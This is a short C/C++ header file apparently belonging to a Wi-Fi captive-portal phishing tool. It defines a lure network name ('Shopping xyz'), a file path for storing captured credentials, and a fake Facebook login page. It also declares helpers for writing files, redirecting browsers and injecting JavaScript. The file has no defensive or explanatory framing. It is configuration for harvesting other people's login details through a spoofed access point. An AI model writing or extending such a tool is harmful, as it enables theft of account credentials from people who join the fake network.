#ifndef UTIL_H
#define UTIL_H

/* ************* Constants *************** */

// Default SSID name
const char* SSID_NAME = "Shopping xyz";

// Credentials file
String credentialsFile = "/credentials.txt";

// Phishing page (fb/gmail/etc)
String phishingPage = "/pages/facebook.html";

/* ************* Types ************** */
String err(String message);
bool writeFile(String path, String content, bool append);
String readFile(String path);
String redirectHTML(String location);
String injectJS(String data);

#endif
